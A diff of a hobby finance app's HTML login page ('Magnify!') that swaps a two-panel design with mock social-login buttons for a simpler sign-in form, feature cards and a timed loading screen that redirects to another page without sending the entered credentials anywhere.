@@ -3,24 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Magnify! - Your Gateway to Financial Management</title>
-    <link rel="icon" href="logo.png">
+    <title>Sign in to your account</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-
-        :root {
-            --gradient-light: #FFC0CB;
-            --gradient-medium: #FF69B4;
-            --gradient-dark: #8A2BE2;
-            --text: #ffffff;
-            --card-bg: rgba(255, 255, 255, 0.1);
-            --accent: #FF1493;
-            --icon-color: #8B008B;
-            --error: #ff4444;
-            --success: #00C851;
-        }
-
         * {
             margin: 0;
             padding: 0;
@@ -30,129 +16,86 @@
 
         body {
             min-height: 100vh;
-            background: linear-gradient(135deg, var(--gradient-light), var(--gradient-medium), var(--gradient-dark));
-            color: var(--text);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow-x: hidden;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 1200px;
-            display: flex;
-            background: var(--card-bg);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
-            animation: fadeIn 1s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .login-section, .finance-section {
-            flex: 1;
-            padding: 4rem;
             display: flex;
             flex-direction: column;
             justify-content: center;
-        }
-
-        .logo-container {
-            display: flex;
             align-items: center;
-            gap: 1rem;
-            margin-bottom: 3rem;
-            animation: slideDown 0.8s ease-out;
+            background: linear-gradient(135deg, #FFC0CB, #FF69B4, #8A2BE2);
+            padding: 2rem;
+            gap: 2rem;
         }
 
-        @keyframes slideDown {
-            from { transform: translateY(-50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+        .container {
+            background-color: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
         }
 
-        .logo {
-            width: 60px;
-            height: 60px;
-            object-fit: contain;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .brand-name {
-            font-size: 2.5rem;
+        h1 {
+            color: white;
+            margin-bottom: 30px;
             font-weight: 600;
-            color: var(--text);
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
         }
 
         .input-group {
+            margin-bottom: 20px;
             position: relative;
-            margin-bottom: 2rem;
-            transition: all 0.3s ease;
         }
 
-        .input-group input {
+        input {
             width: 100%;
-            padding: 1rem 3rem 1rem 1.5rem;
+            padding: 12px 40px 12px 12px;
             background: rgba(255, 255, 255, 0.1);
             border: 2px solid transparent;
-            border-radius: 12px;
-            color: var(--text);
-            font-size: 1rem;
+            border-radius: 10px;
+            font-size: 16px;
+            color: white;
             transition: all 0.3s ease;
         }
 
-        .input-group input:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 15px rgba(255, 105, 180, 0.3);
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        input:focus {
             outline: none;
+            border-color: rgba(255, 255, 255, 0.5);
+            background: rgba(255, 255, 255, 0.2);
         }
 
         .input-group i {
             position: absolute;
-            right: 1rem;
+            right: 12px;
             top: 50%;
             transform: translateY(-50%);
-            color: var(--icon-color);
-            transition: all 0.3s ease;
+            color: rgba(255, 255, 255, 0.7);
         }
 
-        .input-group input:focus + i {
-            color: var(--accent);
-            transform: translateY(-50%) scale(1.1);
-        }
-
-        .login-button {
-            padding: 1rem;
-            border: none;
-            border-radius: 12px;
-            background: linear-gradient(45deg, var(--gradient-medium), var(--gradient-dark));
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #FF69B4, #8A2BE2);
             color: white;
-            font-size: 1.1rem;
-            font-weight: 600;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
             cursor: pointer;
             transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
         }
 
-        .login-button:hover {
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
-            transform: translateY(-3px);
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
 
-        .login-button::after {
+        button::after {
             content: '';
             position: absolute;
             top: -50%;
@@ -164,84 +107,49 @@
             transition: all 0.3s ease;
         }
 
-        .login-button:hover::after {
+        button:hover::after {
             left: 100%;
         }
 
-        .social-login {
-            margin-top: 2rem;
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
+        .links {
+            margin-top: 20px;
         }
 
-        .social-icon {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--text);
+        .links a {
+            color: white;
             text-decoration: none;
+            font-size: 14px;
             transition: all 0.3s ease;
-            font-size: 1.2rem;
-            position: relative;
-            overflow: hidden;
-            cursor: pointer;
+            opacity: 0.8;
         }
 
-        .social-icon:hover {
-            transform: translateY(-5px) rotate(360deg);
+        .links a:hover {
+            opacity: 1;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
         }
 
-        .social-icon.google { background-color: #db4437; }
-        .social-icon.facebook { background-color: #3b5998; }
-        .social-icon.twitter { background-color: #1da1f2; }
-        .social-icon.linkedin { background-color: #0077b5; }
-
-        .finance-section {
-            position: relative;
-            overflow: hidden;
-        }
-
-        .finance-content {
-            position: relative;
-            z-index: 1;
-        }
-
-        .finance-title {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            text-align: center;
-            color: var(--text);
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
-        }
-
-        .finance-stats {
+        .features-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 1rem;
-            animation: fadeInUp 1s ease-out;
+            gap: 20px;
+            width: 100%;
+            max-width: 800px;
         }
 
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .stat-card {
+        .feature-card {
             background: rgba(255, 255, 255, 0.1);
-            padding: 1.5rem;
-            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
             text-align: center;
+            color: white;
             transition: all 0.3s ease;
             cursor: pointer;
             position: relative;
             overflow: hidden;
         }
 
-        .stat-card::before {
+        .feature-card::before {
             content: '';
             position: absolute;
             top: 0;
@@ -252,52 +160,54 @@
             transition: 0.5s;
         }
 
-        .stat-card:hover::before {
+        .feature-card:hover::before {
             left: 100%;
         }
 
-        .stat-card i {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            color: var(--icon-color);
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .feature-card i {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #FF69B4, #8A2BE2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             transition: all 0.3s ease;
         }
 
-        .stat-card:hover i {
-            color: var(--accent);
-            transform: scale(1.1);
+        .feature-card:hover i {
+            transform: scale(1.2);
         }
 
-        .stat-value {
+        .feature-card h2 {
             font-size: 1.5rem;
-            font-weight: bold;
-            margin-bottom: 0.5rem;
+            margin-bottom: 10px;
+            font-weight: 600;
         }
 
-        .stat-label {
+        .feature-card p {
             font-size: 0.9rem;
             opacity: 0.8;
         }
 
-        .error-message {
-            color: var(--error);
-            font-size: 0.9rem;
-            margin-top: 0.5rem;
-            text-align: center;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
+        @media (max-width: 768px) {
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
 
-        .error-message.visible {
-            opacity: 1;
+            body {
+                padding: 1rem;
+            }
         }
 
         .loading-screen {
             position: fixed;
             inset: 0;
-            background: linear-gradient(135deg, var(--gradient-light), var(--gradient-medium), var(--gradient-dark));
+            background: linear-gradient(135deg, #FFC0CB, #FF69B4, #8A2BE2);
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 1000;
@@ -312,296 +222,208 @@
         }
 
         .loading-animation {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .loading-meters {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .meter {
-            width: 60px;
-            height: 60px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 50%;
-            overflow: hidden;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .meter i {
-            font-size: 1.5rem;
-            color: var(--icon-color);
-            z-index: 2;
-        }
-
-        .meter-fill {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 0;
-            background: var(--accent);
-            transition: height 0.5s ease;
-        }
-
-        .loading-text {
-            margin-top: 1rem;
-            font-size: 1.2rem;
-            color: var(--text);
             text-align: center;
+            color: white;
         }
 
-        @media (max-width: 768px) {
-            .container {
-                flex-direction: column;
-                margin: 1rem;
-            }
+        .loading-icons {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
 
-            .login-section, .finance-section {
-                width: 100%;
-                padding: 2rem;
-            }
+        .loading-icon {
+            display: inline-block;
+            margin: 0 0.5rem;
+            opacity: 0.2;
+            transition: opacity 0.3s ease;
+        }
 
-            .finance-stats {
-                grid-template-columns: 1fr;
+        .loading-icon.active {
+            opacity: 1;
+        }
+
+        @keyframes ripple {
+            to {
+                transform: scale(4);
+                opacity: 0;
             }
         }
     </style>
 </head>
 <body>
-    <main class="container">
-        <section class="login-section">
-            <div class="logo-container">
-                <img src="logo.png?height=60&width=60" alt="Magnify Logo" class="logo">
-                <h1 class="brand-name"><strong>Magnify!</strong></h1>
+    <div class="container">
+        <h1>Magnify!</h1>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="Email, phone, or Skype" required>
+                <i class="fas fa-user"></i>
             </div>
-            <form id="loginForm">
-                <div class="input-group">
-                    <input type="text" id="username" placeholder="Username or Email" required>
-                    <i class="fas fa-user"></i>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="Password" required>
-                    <i class="fas fa-lock"></i>
-                </div>
-                <button type="submit" class="login-button">Sign In</button>
-                <div id="errorMessage" class="error-message"></div>
-            </form>
-            <div class="social-login">
-                <div class="social-icon google" onclick="changePlatform('google')"><i class="fab fa-google"></i></div>
-                <div class="social-icon facebook" onclick="changePlatform('facebook')"><i class="fab fa-facebook-f"></i></div>
-                <div class="social-icon twitter" onclick="changePlatform('twitter')"><i class="fab fa-twitter"></i></div>
-                <div class="social-icon linkedin" onclick="changePlatform('linkedin')"><i class="fab fa-linkedin-in"></i></div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+                <i class="fas fa-lock"></i>
             </div>
-        </section>
-        <section class="finance-section">
-            <div class="finance-content">
-                <h2 class="finance-title">Your Gateway to Financial Management</h2>
-                <div class="finance-stats">
-                    <div class="stat-card">
-                        <i class="fas fa-piggy-bank"></i>
-                        <div class="stat-value">Mark!</div>
-                        <div class="stat-label">Your Total Savings</div>
-                    </div>
-                    <div class="stat-card">
-                        <i class="fas fa-chart-line"></i>
-                        <div class="stat-value">Organize</div>
-                        <div class="stat-label">Your Monthly Income</div>
-                    </div>
-                    <div class="stat-card">
-                        <i class="fas fa-coins"></i>
-                        <div class="stat-value">Assemble</div>
-                        <div class="stat-label">Your Investment Growth</div>
-                    </div>
-                    <div class="stat-card">
-                        <i class="fas fa-shield-alt"></i>
-                        <div class="stat-value">Magnify It!</div>
-                        <div class="stat-label">You Are Safe With Us</div>
-                    </div>
-                </div>
-            </div>
-        </section>
-    </main>
+            <button type="submit">Next</button>
+        </form>
+        <div class="links">
+            <a href="#">No account? Create one!</a>
+            <br>
+            <a href="#">Can't access your account?</a>
+        </div>
+    </div>
+
+    <div class="features-grid">
+        <div class="feature-card" onclick="showFeatureDetails('savings')">
+            <i class="fas fa-piggy-bank"></i>
+            <h2>Mark!</h2>
+            <p>Your Total Savings</p>
+        </div>
+        <div class="feature-card" onclick="showFeatureDetails('income')">
+            <i class="fas fa-chart-line"></i>
+            <h2>Organize</h2>
+            <p>Your Monthly Income</p>
+        </div>
+        <div class="feature-card" onclick="showFeatureDetails('investment')">
+            <i class="fas fa-coins"></i>
+            <h2>Assemble</h2>
+            <p>Your Investment Growth</p>
+        </div>
+        <div class="feature-card" onclick="showFeatureDetails('security')">
+            <i class="fas fa-shield-alt"></i>
+            <h2>Magnify It!</h2>
+            <p>You Are Safe With Us</p>
+        </div>
+    </div>
 
     <div class="loading-screen" id="loadingScreen">
         <div class="loading-animation">
-            <div class="loading-meters">
-                <div class="meter">
-                    <i class="fas fa-piggy-bank"></i>
-                    <div class="meter-fill"></div>
-                </div>
-                <div class="meter">
-                    <i class="fas fa-chart-line"></i>
-                    <div class="meter-fill"></div>
-                </div>
-                <div class="meter">
-                    <i class="fas fa-coins"></i>
-                    <div class="meter-fill"></div>
-                </div>
-                <div class="meter">
-                    <i class="fas fa-shield-alt"></i>
-                    <div class="meter-fill"></div>
-                </div>
+            <div class="loading-icons">
+                <i class="loading-icon fas fa-money-bill-wave"></i>
+                <i class="loading-icon fas fa-chart-line"></i>
+                <i class="loading-icon fas fa-piggy-bank"></i>
+                <i class="loading-icon fas fa-coins"></i>
             </div>
-            <div class="loading-text">Magnifying your future...</div>
+            <p id="loadingText">Processing your request...</p>
         </div>
     </div>
 
     <script>
-        let currentPlatform = 'email';
-
-        function changePlatform(platform) {
-            currentPlatform = platform;
-            const usernameInput = document.getElementById('username');
-            const passwordInput = document.getElementById('password');
-            const socialIcons = document.querySelectorAll('.social-icon');
-
-            socialIcons.forEach(icon => icon.classList.remove('active'));
-            document.querySelector(`.social-icon.${platform}`).classList.add('active');
-
-            switch(platform) {
-                case 'google':
-                    usernameInput.placeholder = 'Google Email';
-                    passwordInput.placeholder = 'Google Password';
-                    break;
-                case 'facebook':
-                    usernameInput.placeholder = 'Facebook Email or Phone';
-                    passwordInput.placeholder = 'Facebook Password';
-                    break;
-                case 'twitter':
-                    usernameInput.placeholder = 'Twitter Username or Email';
-                    passwordInput.placeholder = 'Twitter Password';
-                    break;
-                case 'linkedin':
-                    usernameInput.placeholder = 'LinkedIn Email';
-                    passwordInput.placeholder = 'LinkedIn Password';
-                    break;
-                default:
-                    usernameInput.placeholder = 'Username or Email';
-                    passwordInput.placeholder = 'Password';
-            }
-
-            // Animate input fields
-            usernameInput.classList.add('animate');
-            passwordInput.classList.add('animate');
-            setTimeout(() => {
-                usernameInput.classList.remove('animate');
-                passwordInput.classList.remove('animate');
-            }, 500);
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', (e) => {
+        // Login form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const errorMessage = document.getElementById('errorMessage');
-
-            // Validate credentials based on the current platform
-            if (!isValidCredentials(username, password, currentPlatform)) {
-                errorMessage.textContent = `Invalid ${currentPlatform} credentials. Please try again.`;
-                errorMessage.classList.add('visible');
-                shakeForm();
-                return;
-            }
-
-            // If credentials are valid, proceed with login
-            errorMessage.classList.remove('visible');
             const loadingScreen = document.getElementById('loadingScreen');
+            const loadingText = document.getElementById('loadingText');
+            const loadingIcons = document.querySelectorAll('.loading-icon');
             loadingScreen.classList.add('active');
-            
-            const loadingTexts = [
-                'Checking your credentials...',
-                'Preparing your dashboard...',
-                'Almost there...',
-                'Loading financial data...',
-                'Securing connection...'
-            ];
-            
-            let currentIndex = 0;
-            const loadingText = document.querySelector('.loading-text');
-            const textInterval = setInterval(() => {
-                loadingText.textContent = loadingTexts[currentIndex];
-                currentIndex = (currentIndex + 1) % loadingTexts.length;
-            }, 2000);
 
-            const meters = document.querySelectorAll('.meter-fill');
-            meters.forEach((meter, index) => {
-                setTimeout(() => {
-                    meter.style.height = '100%';
-                }, index * 500);
-            });
-            
+            const loadingMessages = [
+                'Verifying credentials...',
+                'Checking account status...',
+                'Preparing your dashboard...',
+                'Almost there...'
+            ];
+
+            let messageIndex = 0;
+            let iconIndex = 0;
+
+            const messageInterval = setInterval(() => {
+                loadingText.textContent = loadingMessages[messageIndex];
+                messageIndex = (messageIndex + 1) % loadingMessages.length;
+            }, 1000);
+
+            const iconInterval = setInterval(() => {
+                loadingIcons.forEach(icon => icon.classList.remove('active'));
+                loadingIcons[iconIndex].classList.add('active');
+                iconIndex = (iconIndex + 1) % loadingIcons.length;
+            }, 500);
+
+            // Simulate login process
             setTimeout(() => {
-                clearInterval(textInterval);
+                clearInterval(messageInterval);
+                clearInterval(iconInterval);
                 loadingScreen.classList.remove('active');
+                // Redirect to Entrep.html
                 window.location.href = 'Entrep.html';
-            }, 5000);
+            }, 4000);
         });
 
-        function isValidCredentials(username, password, platform) {
-            // This is a mock validation. In a real application, you would check these against a backend.
-            switch(platform) {
-                case 'google':
-                    return username.includes('@gmail.com') && password.length >= 8;
-                case 'facebook':
-                    return username.includes('@') && password.length >= 6;
-                case 'twitter':
-                    return (username.startsWith('@') || username.includes('@')) && password.length >= 6;
-                case 'linkedin':
-                    return username.includes('@') && password.length >= 6;
-                default:
-                    return username.length > 0 && password.length >= 8;
-            }
+        // Feature card details
+        function showFeatureDetails(feature) {
+            const features = {
+                savings: {
+                    title: 'Total Savings Tracker',
+                    description: 'Track and analyze your savings with powerful visualization tools'
+                },
+                income: {
+                    title: 'Income Management',
+                    description: 'Organize and optimize your monthly income streams'
+                },
+                investment: {
+                    title: 'Investment Portfolio',
+                    description: 'Monitor and grow your investment portfolio'
+                },
+                security: {
+                    title: 'Security Features',
+                    description: 'Your data is protected with state-of-the-art security'
+                }
+            };
+
+            const details = features[feature];
+            const loadingScreen = document.getElementById('loadingScreen');
+            const loadingText = document.getElementById('loadingText');
+            
+            loadingScreen.classList.add('active');
+            loadingText.innerHTML = `
+                <h3 style="margin-bottom: 10px">${details.title}</h3>
+                <p>${details.description}</p>
+            `;
+
+            setTimeout(() => {
+                loadingScreen.classList.remove('active');
+            }, 2000);
         }
 
-        function shakeForm() {
-            const form = document.getElementById('loginForm');
-            form.classList.add('shake');
-            setTimeout(() => form.classList.remove('shake'), 500);
-        }
+        // Add hover effect to input groups
+        document.querySelectorAll('.input-group').forEach(group => {
+            const input = group.querySelector('input');
+            const icon = group.querySelector('i');
 
-        // Enhanced input animations
-        document.querySelectorAll('.input-group input').forEach(input => {
             input.addEventListener('focus', () => {
-                input.parentElement.style.transform = 'scale(1.02)';
-                input.parentElement.style.transition = 'all 0.3s ease';
+                icon.style.color = 'white';
+                group.style.transform = 'scale(1.02)';
             });
 
             input.addEventListener('blur', () => {
-                input.parentElement.style.transform = 'scale(1)';
+                icon.style.color = 'rgba(255, 255, 255, 0.7)';
+                group.style.transform = 'scale(1)';
             });
         });
 
-        // Enhanced stat card animations
-        document.querySelectorAll('.stat-card').forEach(card => {
-            card.addEventListener('mouseover', () => {
-                card.style.transform = 'translateY(-10px) scale(1.02)';
-                card.style.boxShadow = '0 10px 20px rgba(0, 0, 0, 0.2)';
-            });
-
-            card.addEventListener('mouseout', () => {
-                card.style.transform = 'translateY(0) scale(1)';
-                card.style.boxShadow = 'none';
-            });
-        });
-
-        // Social icons enhanced animation
-        document.querySelectorAll('.social-icon').forEach(icon => {
-            icon.addEventListener('mouseover', () => {
-                icon.style.transform = 'scale(1.2) translateY(-5px)';
-                icon.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.2)';
-            });
-
-            icon.addEventListener('mouseout', () => {
-                icon.style.transform = 'scale(1) translateY(0)';
-                icon.style.boxShadow = 'none';
+        // Add ripple effect to feature cards
+        document.querySelectorAll('.feature-card').forEach(card => {
+            card.addEventListener('click', function(e) {
+                const ripple = document.createElement('div');
+                ripple.classList.add('ripple');
+                
+                const rect = this.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                
+                ripple.style.cssText = `
+                    position: absolute;
+                    background: rgba(255, 255, 255, 0.2);
+                    border-radius: 50%;
+                    pointer-events: none;
+                    width: 100px;
+                    height: 100px;
+                    left: ${x - 50}px;
+                    top: ${y - 50}px;
+                    transform: scale(0);
+                    animation: ripple 0.6s linear;
+                `;
+                
+                this.appendChild(ripple);
+                
+                setTimeout(() => ripple.remove(), 600);
             });
         });
     </script>
